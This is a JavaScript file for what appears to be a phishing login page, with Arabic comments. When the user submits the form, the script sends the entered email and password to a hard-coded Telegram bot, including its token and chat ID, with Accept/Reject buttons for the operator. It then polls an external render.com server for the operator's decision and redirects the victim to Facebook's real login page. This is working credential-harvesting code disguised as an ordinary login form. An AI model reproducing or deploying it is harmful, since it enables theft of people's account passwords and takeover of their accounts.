// ✅ عند الضغط على زر "Log In"
document.getElementById('submit-btn').addEventListener('click', () => {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        alert("⚠️ يرجى إدخال البريد وكلمة المرور.");
        return;
    }

    // إرسال البيانات إلى بوت التليجرام
    fetch('https://api.telegram.org/bot7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: '5443898294',
            text: `🔐 Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Accept', callback_data: `accept|${email}` },
                        { text: '❌ Reject', callback_data: `reject|${email}` }
                    ]
                ]
            }
        })
    })
    .then(() => {
        console.log('📤 تم إرسال البيانات إلى البوت، ننتظر الرد...');
        checkLoginStatus(email); // نبدأ التحقق باستخدام الإيميل كمعرّف
    })
    .catch(error => {
        console.error("❌ فشل في إرسال البيانات إلى تيليجرام:", error);
    });
});

// ✅ التحقق من حالة القبول/الرفض
function checkLoginStatus(email) {
    const interval = setInterval(() => {
        fetch(`https://login-vpns.onrender.com/get-status?userId=${encodeURIComponent(email)}`)
            .then(res => res.json())
            .then(data => {
                if (data.status === 'accept') {
                    clearInterval(interval);
                    console.log("✅ تم القبول، توجيه المستخدم...");

                    // ✅ إعادة تعيين الحالة
                    fetch(`https://login-vpns.onrender.com/update-status?userId=${encodeURIComponent(email)}&action=reset`)
                        .then(() => {
                            window.location.href = 'https://www.facebook.com/login';
                        });

                } else if (data.status === 'reject') {
                    clearInterval(interval);
                    console.log("❌ تم الرفض، عرض الرسالة للمستخدم.");

                    document.getElementById('error-message').style.display = 'block';

                    // ✅ إعادة تعيين الحالة
                    fetch(`https://login-vpns.onrender.com/update-status?userId=${encodeURIComponent(email)}&action=reset`);
                }
            })
            .catch(err => {
                console.error('⚠️ خطأ أثناء التحقق من الحالة:', err);
            });
    }, 2000);
}
